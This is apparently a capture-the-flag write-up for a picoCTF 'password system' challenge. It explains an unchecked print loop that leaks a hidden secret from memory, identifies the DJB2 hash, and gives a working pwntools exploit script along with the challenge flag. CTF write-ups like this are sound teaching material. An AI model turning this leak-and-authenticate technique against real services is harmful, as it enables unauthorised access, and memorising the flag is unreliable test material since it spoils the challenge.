
We are given a “password system” that:

1. Lets us input a password
2. Asks for its length
3. Prints stored password bytes
4. Asks for a **hash to authenticate**

At first glance, it looks like a hashing challenge — but it’s actually a **logic + memory leak vulnerability**.

After input:

```
Password: A
Length: 80
```

We get:

```
Your successfully stored password:
...
```

👉 It prints **a sequence of numbers (bytes)**

From reversing (`gdb`):

* Program allocates buffer using `calloc(0x5a)` → **90 bytes**
* But printing loop:

```c
for (i = 0; i <= user_length; i++)
    printf("%d ", buffer[i]);
```

👉 No bounds check ❌

So:

* If we give **length = 80**
* But password = `"A"` (1 byte)

👉 It prints:

* Our input ✔️
* PLUS **uninitialized / hidden memory** ❗

From GDB:

```c
secret[i] = obf_bytes[i] ^ 0xAA
```

This secret is stored **inside the same buffer**, offset around index `60`.

So when we print 80 bytes:
👉 We leak the secret!

From reversing:

```c
hash = (hash * 33 + c)
```

👉 This is **DJB2 hash function**

64-bit version:

```python
h = 0x1505
for c in data:
    h = (h * 33 + c) & 0xFFFFFFFFFFFFFFFF
```

1. Send small password (`"A"`)
2. Send large length (`80`)
3. Capture printed bytes
4. Extract secret (offset 60–72)
5. Compute DJB2 hash
6. Send hash → get flag

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "candy-mountain.picoctf.net"
PORT = 53885

def djb2_64(data: bytes) -> int:
    h = 0x1505
    for c in data:
        h = (h * 33 + c) & 0xFFFFFFFFFFFFFFFF
    return h

io = remote(HOST, PORT)

# Step 1: Send small password
io.recvuntil(b"Please set a password for your account:")
io.sendline(b"A")

# Step 2: Overflow length
io.recvuntil(b"How many bytes in length is your password?")
io.sendline(b"80")

# Step 3: Read leaked bytes
io.recvuntil(b"Your successfully stored password:")

line = io.recvline().strip()
while line == b"":
    line = io.recvline().strip()

nums = [int(x) for x in re.findall(rb"-?\d+", line)]

# Step 4: Extract secret (known offset)
secret = bytes((x & 0xff) for x in nums[60:72])

# Step 5: Compute hash
h = djb2_64(secret)

print("[+] secret =", secret)
print("[+] hash =", h)

# Step 6: Send hash
io.recvuntil(b"Enter your hash to access your account!")
io.sendline(str(h).encode())

# Step 7: Get flag
print(io.recvall().decode())
```

## 🏁 Final Output

```
picoCTF{d0nt_trust_us3rs}
```

